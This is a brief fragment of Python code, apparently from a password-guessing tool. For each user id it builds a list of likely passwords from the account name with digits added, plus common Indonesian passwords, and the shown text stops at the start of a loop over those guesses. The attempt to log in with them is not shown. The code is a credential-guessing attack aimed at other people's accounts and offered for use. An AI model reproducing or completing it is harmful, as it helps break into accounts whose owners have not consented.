...
def bapi(user):
	...
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345", name+"1", "sayang", "indonesia", "anjing", "12345678" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345", name+"1", "sayang", "indonesia", "anjing", "12345678" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345", name+"1", "sayang", "indonesia", "anjing", "12345678" ]
	else:
		pwx = [ name+"123", name+"12345", name+"1", "sayang", "indonesia", "anjing", "12345678" ]
	try:
		for pw in pwx:
